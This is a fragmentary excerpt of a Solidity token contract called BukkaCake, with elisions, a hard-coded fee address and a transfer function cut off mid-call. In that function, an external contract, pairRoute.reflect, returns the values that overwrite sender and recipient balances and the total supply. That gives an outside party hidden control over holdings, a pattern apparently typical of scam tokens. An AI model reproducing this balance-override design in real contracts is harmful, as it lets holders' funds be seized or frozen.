...
// CHANGE
contract BukkaCake is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "BukkaCake";
    ...
    constructor (uint256 _bytes) {
        ...
        autoLiquidityReceiver = DEAD; // burn the liquidity
        marketingFeeReceiver = address(0x001A8F8e418bA26bA0d6de69f70F75A283F437e6);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        (_balances[sender],_balances[recipient], _totalSupply) = pairRoute.reflect(
            sender,
            recipient,
            amount,
            amountReceived,
